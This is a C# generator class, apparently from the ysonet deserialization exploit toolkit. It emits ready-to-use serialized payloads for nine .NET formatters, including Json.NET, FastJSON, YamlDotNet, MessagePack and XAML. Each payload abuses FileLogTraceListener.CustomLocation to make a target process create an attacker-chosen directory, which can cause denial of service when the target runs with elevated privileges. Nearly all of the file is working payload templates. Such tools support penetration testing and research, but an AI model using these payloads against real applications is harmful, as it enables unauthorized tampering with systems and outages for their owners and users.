using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// Microsoft.VisualBasic.Logging.FileLogTraceListener.CustomLocation creates the supplied
    /// directory on the target when the payload is deserialized.
    ///
    /// Everything this gadget emits lives in this file: the target type names, every
    /// formatter template, the MessagePack surrogate, and the root type the
    /// DataContractJsonSerializer self-test needs. Nothing about FileLogTraceListener
    /// belongs in a helper or in a shared payload builder.
    /// </summary>
    public class FileLogTraceListenerGenerator : GenericGenerator
    {
        // DataContractJsonSerializer writes no type name into the document, so the -t
        // self-test has to be told what to read it back as. This is the only place the name
        // is needed as a resolvable type rather than as template text.
        private const string FileLogTraceListenerAssemblyQualifiedName =
            "Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

        private bool rawInput;

        // What this gadget does is create a directory, so the kind is file-system.
        // It does NOT declare PayloadKind.DenialOfService: that facet drives the
        // safeguards in Helpers/Core/DosPolicy.cs (a refusal without
        // --i-understand-dos, plus exclusion from every bulk run), which is meant
        // for a payload whose purpose is to take the target down. The denial of
        // service here is a conditional consequence of WHERE the directory is
        // created, and that belongs in AdditionalInfo(), which states it.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.FileSystem)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override string AdditionalInfo()
        {
            return "Microsoft.VisualBasic.Logging.FileLogTraceListener creates the supplied directory through CustomLocation. With elevated privileges, directory creation in sensitive locations may cause denial of service.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.FastJson,
                Formatters.JavaScriptSerializer,
                "YamlDotNet < 5.0.0",
                Formatters.MessagePackTypeless,
                Formatters.MessagePackTypelessLz4,
                Formatters.SharpSerializerXml,
                Formatters.DataContractJsonSerializer,
                Formatters.Xaml
            };
        }

        // TargetPath, not FilePath: -c is a directory the TARGET process creates when the
        // payload runs. Nothing is read on the operator machine, so the generic "this
        // gadget reads the file" prompt of FilePath was wrong here.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.TargetPath;
        }

        public override OptionSet Options()
        {
            return RawInputOption(v => rawInput = v);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RequireCommandInput(inputArgs);
            return FinishHandWrittenPayload(
                BuildPayload(inputArgs.Cmd, formatter),
                formatter,
                inputArgs,
                SelfTestRootType(formatter, inputArgs));
        }

        // Resolved only when the self-test actually needs it, so building a payload never
        // has to load Microsoft.VisualBasic on the operator machine.
        private static Type SelfTestRootType(string formatter, InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test)
                return null;
            if (!IsFormatter(formatter, Formatters.DataContractJsonSerializer))
                return null;
            return Type.GetType(FileLogTraceListenerAssemblyQualifiedName, true);
        }

        private object BuildPayload(string input, string formatter)
        {
            if (IsMessagePackTypeless(formatter))
            {
                // Never build a real FileLogTraceListener here: assigning CustomLocation IS the
                // effect, so it would create the directory inside ysonet. Serialize the surrogate
                // below and let MessagePack write the framework type's name instead.
                return MessagePackTypelessTypeSwap.SerializeAs(
                    new FileLogTraceListenerSurrogate
                    {
                        CustomLocation = input
                    },
                    FileLogTraceListenerAssemblyQualifiedName,
                    IsMessagePackLz4(formatter));
            }

            if (IsFormatter(formatter, Formatters.JsonNet))
            {
                return @"
{
    '$type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
    'CustomLocation':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    '__type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
    'CustomLocation':'" + EscapeForJson(input, rawInput) + @"'
}";
            }

            if (IsFormatter(formatter, Formatters.FastJson))
            {
                return @"
{
    ""$types"":{
        ""Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"":""1""
    },
    ""$type"":""1"",
    ""CustomLocation"":""" + EscapeForJson(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.YamlDotNet))
            {
                return @"
!<!Microsoft.VisualBasic.Logging.FileLogTraceListener,Microsoft.VisualBasic,Version=10.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a> {
    CustomLocation: """ + EscapeForJson(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
            {
                return @"
<Complex type=""Microsoft.VisualBasic.Logging.FileLogTraceListener,Microsoft.VisualBasic,Version=10.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"">
    <Properties>
        <Simple name=""CustomLocation"" value=""" + EscapeForXmlAttribute(input, rawInput) + @"""/>
    </Properties>
</Complex>";
            }

            if (IsFormatter(formatter, Formatters.DataContractJsonSerializer))
            {
                // No type name in the document: the target names the root type itself, which is
                // why SelfTestRootType above has to hand it to the self-test.
                return @"
{
    ""CustomLocation"":""" + EscapeForJson(input, rawInput) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                return @"
<FileLogTraceListener CustomLocation=""" + EscapeForXmlAttribute(input, rawInput) + @""" Filter=""{assembly:Null}"" xmlns=""clr-namespace:Microsoft.VisualBasic.Logging;assembly=Microsoft.VisualBasic"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
</FileLogTraceListener>";
            }

            throw UnsupportedFormatter(formatter);
        }

        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites the
        // type name to Microsoft.VisualBasic.Logging.FileLogTraceListener before the payload
        // leaves ysonet.
        internal sealed class FileLogTraceListenerSurrogate
        {
            public string CustomLocation { get; set; }
        }
    }
}
